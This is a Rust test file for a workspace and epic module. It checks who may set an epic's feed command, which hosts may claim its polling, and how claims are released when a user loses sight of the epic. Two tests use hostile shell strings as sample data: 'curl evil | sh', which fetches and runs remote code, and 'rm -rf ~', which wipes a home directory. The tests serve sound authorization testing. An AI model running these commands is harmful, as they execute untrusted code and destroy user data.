//! Feed command authority and poll claims (`feeds.allium:
//! FeedCommandAuthority`, `FeedCommandRunsOnSettersHost`; `store-split.allium:
//! ClaimPollOwner`, `OverridePollOwner`; `workspaces.allium: ClaimsFollowSight`),
//! run against the in-memory store. Twins of the in-memory caller's
//! `src/sync/memory_caller/tests/feed_authority.rs`.

mod common;

use common::*;
use dispatch_spacetime_module::*;
#[allow(unused_imports)]
use spacetimedb::Table;

/// `root` is super-admin. `alice` (the epic's creator), `bob` and `carol` are
/// members of workspace A (`boss` administers it); `alice` and `bob` also
/// belong to B. Each person has
/// a host, `h-<name>`. Returns (store, A, B).
fn world() -> (Store, i64, i64) {
    let store = Store::bare();
    for who in ["root", "alice", "bob", "carol", "boss"] {
        store
            .call(who, |ctx| {
                stamp_rules_version_on_connect(ctx);
                Ok(())
            })
            .expect("connect");
    }
    store
        .call("root", |ctx| claim_super_admin(ctx))
        .expect("claim");
    let mut ids = Vec::new();
    for name in ["A", "B"] {
        store
            .call("root", |ctx| create_workspace(ctx, name.into()))
            .expect("workspace");
        ids.push(
            store
                .db()
                .workspaces()
                .iter()
                .find(|w| w.name == name)
                .expect("ws")
                .id,
        );
    }
    store
        .call("root", |ctx| {
            add_member(ctx, ids[0], identity_of("boss"), "admin".into())
        })
        .expect("admin");
    for (ws, who) in [
        (ids[0], "alice"),
        (ids[0], "bob"),
        (ids[0], "carol"),
        (ids[1], "alice"),
        (ids[1], "bob"),
    ] {
        store
            .call("root", |ctx| {
                add_member(ctx, ws, identity_of(who), "member".into())
            })
            .expect("member");
    }
    for who in ["alice", "bob", "carol"] {
        store.register_host_for(&format!("h-{who}"), who);
    }
    (store, ids[0], ids[1])
}

fn make_epic(store: &Store, who: &str, row: Epic) -> i64 {
    store
        .call(who, |ctx| create_epic(ctx, row))
        .expect("create_epic");
    store.db().epics().iter().map(|e| e.id).max().expect("epic")
}

/// alice's public feed epic in `a`.
fn feed_epic(store: &Store, a: i64) -> i64 {
    make_epic(
        store,
        "alice",
        Epic {
            title: "feed".into(),
            workspace_id: a,
            feed_command: "gh-feed".into(),
            ..blank_epic()
        },
    )
}

fn claim(store: &Store, who: &str, scope: &str, id: i64, host: &str) -> Result<(), String> {
    store.call(who, |ctx| {
        claim_poll_owner(ctx, scope.into(), id, host.into())
    })
}

fn override_to(store: &Store, who: &str, scope: &str, id: i64, host: &str) -> Result<(), String> {
    store.call(who, |ctx| {
        override_poll_owner(ctx, scope.into(), id, host.into())
    })
}

/// A claim row as an older release, or a host that claimed before the rule,
/// would have left it: written straight to the table.
fn legacy_claim(store: &Store, epic: i64, host: &str) {
    store.db().poll_owners().insert(PollOwner {
        id: 0,
        scope: "epic".into(),
        scope_id: epic,
        host: host.into(),
        claimed_at: String::new(),
    });
}

fn claim_hosts(store: &Store) -> Vec<String> {
    let mut hosts: Vec<String> = store.db().poll_owners().iter().map(|p| p.host).collect();
    hosts.sort();
    hosts
}

fn set_command(store: &Store, who: &str, epic: i64, command: &str) -> Result<(), String> {
    store.call(who, |ctx| {
        patch_epic(
            ctx,
            epic,
            EpicPatch {
                feed_command: Some(command.into()),
                ..EpicPatch::default()
            },
        )
    })
}

// -- M2: who may change a command, and who is its setter ------------------------

#[test]
fn a_new_epic_with_a_command_records_its_creator_as_the_setter() {
    let (store, a, _) = world();
    let id = make_epic(
        &store,
        "carol",
        Epic {
            workspace_id: a,
            feed_command: "curl evil | sh".into(),
            feed_command_set_by: identity_of("bob"), // a client's claim is ignored
            ..blank_epic()
        },
    );
    assert_eq!(store.epic(id).feed_command_set_by, identity_of("carol"));
    let plain = make_epic(
        &store,
        "carol",
        Epic {
            workspace_id: a,
            ..blank_epic()
        },
    );
    assert_eq!(store.epic(plain).feed_command_set_by, "");
}

#[test]
fn the_owner_of_the_host_holding_the_claim_may_not_change_the_command() {
    let (store, a, _) = world();
    let epic = feed_epic(&store, a);
    legacy_claim(&store, epic, "h-carol");
    assert!(set_command(&store, "carol", epic, "rm -rf ~").is_err());
    assert_eq!(store.epic(epic).feed_command, "gh-feed");
}

#[test]
fn changing_the_command_records_the_setter_and_releases_other_claims() {
    let (store, a, _) = world();
    let epic = feed_epic(&store, a);
    legacy_claim(&store, epic, "h-alice");
    legacy_claim(&store, epic, "h-bob");
    set_command(&store, "boss", epic, "new-feed").expect("an admin may");
    assert_eq!(store.epic(epic).feed_command_set_by, identity_of("boss"));
    // boss has no host, so nobody's claim survives.
    assert!(claim_hosts(&store).is_empty());
}

#[test]
fn keeping_the_command_keeps_the_setter_and_the_claims() {
    let (store, a, _) = world();
    let epic = feed_epic(&store, a);
    legacy_claim(&store, epic, "h-bob");
    store
        .call("alice", |ctx| {
            patch_epic(
                ctx,
                epic,
                EpicPatch {
                    feed_command: Some("gh-feed".into()),
                    title: Some("renamed".into()),
                    ..EpicPatch::default()
                },
            )
        })
        .expect("patch");
    assert_eq!(store.epic(epic).feed_command_set_by, identity_of("alice"));
    assert_eq!(claim_hosts(&store), ["h-bob"]);
}

// -- M2: claiming and overriding need sight, and a feed epic its setter ----------

#[test]
fn a_claim_on_an_epic_the_caller_cannot_see_is_refused() {
    let (store, a, _) = world();
    let epic = feed_epic(&store, a);
    store
        .call("alice", |ctx| {
            set_epic_visibility(ctx, epic, "private".into())
        })
        .expect("private");
    assert!(claim(&store, "carol", "epic", epic, "h-carol").is_err());
    assert!(override_to(&store, "carol", "epic", epic, "h-carol").is_err());
    assert!(claim_hosts(&store).is_empty());
}

#[test]
fn a_claim_on_a_task_the_caller_cannot_see_is_refused() {
    let (store, _, _) = world();
    let task = store.create("alice", user_task("t", "alice"));
    assert!(claim(&store, "carol", "task", task, "h-carol").is_err());
    claim(&store, "alice", "task", task, "h-alice").expect("the owner may");
}

#[test]
fn a_claim_on_a_scope_that_does_not_exist_is_refused() {
    let (store, _, _) = world();
    assert!(claim(&store, "alice", "epic", 99, "h-alice").is_err());
    assert!(claim(&store, "alice", "task", 99, "h-alice").is_err());
}

#[test]
fn a_host_whose_owner_did_not_set_the_command_cannot_claim_the_feed() {
    let (store, a, _) = world();
    let epic = feed_epic(&store, a);
    assert!(claim(&store, "carol", "epic", epic, "h-carol").is_err());
    assert!(override_to(&store, "carol", "epic", epic, "h-carol").is_err());
    assert!(claim_hosts(&store).is_empty());
    claim(&store, "alice", "epic", epic, "h-alice").expect("the setter's host may");
    assert_eq!(claim_hosts(&store), ["h-alice"]);
}

#[test]
fn an_epic_without_a_command_can_be_claimed_by_any_host_that_sees_it() {
    let (store, a, _) = world();
    let epic = make_epic(
        &store,
        "alice",
        Epic {
            workspace_id: a,
            ..blank_epic()
        },
    );
    claim(&store, "carol", "epic", epic, "h-carol").expect("no command, nothing to run");
}

// -- M4: every loss-of-sight path releases the claims it strands ------------------

const LOSS_OF_SIGHT_PATHS: [&str; 5] = [
    "remove_member",
    "move_epic_to_workspace",
    "set_epic_visibility",
    "reparent_under_a_private_epic",
    "managed_root_made_private",
];

fn carol_loses_sight_by(path: &str, store: &Store, a: i64, epic: i64) {
    match path {
        "remove_member" => {
            let id = store
                .db()
                .memberships()
                .iter()
                .find(|m| m.workspace_id == a && m.user == identity_of("carol"))
                .expect("membership")
                .id;
            store
                .call("root", |ctx| remove_member(ctx, id))
                .expect("remove");
        }
        "move_epic_to_workspace" => {
            let b = store
                .db()
                .workspaces()
                .iter()
                .find(|w| w.name == "B")
                .expect("B")
                .id;
            store
                .call("root", |ctx| move_epic_to_workspace(ctx, epic, b))
                .expect("move");
        }
        "set_epic_visibility" => {
            store
                .call("alice", |ctx| {
                    set_epic_visibility(ctx, epic, "private".into())
                })
                .expect("private");
        }
        "reparent_under_a_private_epic" => {
            let private = make_epic(
                store,
                "alice",
                Epic {
                    workspace_id: a,
                    visibility: "private".into(),
                    ..blank_epic()
                },
            );
            store
                .call("alice", |ctx| {
                    patch_epic(
                        ctx,
                        epic,
                        EpicPatch {
                            parent_epic_id: Some(private),
                            ..EpicPatch::default()
                        },
                    )
                })
                .expect("reparent");
        }
        "managed_root_made_private" => {
            // Written straight to the table: a patch of the command would
            // release the claims by itself and hide what is under test.
            let row = store.epic(epic);
            store.db().epics().id().update(Epic {
                feed_role: "reviews-parent".into(),
                ..row
            });
            store
                .call("alice", |ctx| {
                    ensure_managed_epics(ctx, "gh-feed".into(), 0, String::new(), 0)
                })
                .expect("ensure");
        }
        other => panic!("unknown loss-of-sight path {other}"),
    }
}

#[test]
fn every_loss_of_sight_path_releases_the_claims_it_strands() {
    for path in LOSS_OF_SIGHT_PATHS {
        let (store, a, _) = world();
        let epic = feed_epic(&store, a);
        legacy_claim(&store, epic, "h-alice");
        legacy_claim(&store, epic, "h-carol");
        carol_loses_sight_by(path, &store, a, epic);
        let hosts = claim_hosts(&store);
        assert!(
            !hosts.contains(&"h-carol".to_string()),
            "{path}: carol's claim survived: {hosts:?}"
        );
        assert!(
            hosts.contains(&"h-alice".to_string()),
            "{path}: alice's claim was released: {hosts:?}"
        );
    }
}

#[test]
fn a_visibility_flip_also_releases_claims_on_the_sub_epics() {
    let (store, a, _) = world();
    let root = feed_epic(&store, a);
    let sub = make_epic(
        &store,
        "alice",
        Epic {
            workspace_id: a,
            parent_epic_id: root,
            ..blank_epic()
        },
    );
    legacy_claim(&store, sub, "h-carol");
    store
        .call("alice", |ctx| {
            set_epic_visibility(ctx, root, "private".into())
        })
        .expect("private");
    assert!(claim_hosts(&store).is_empty());
}
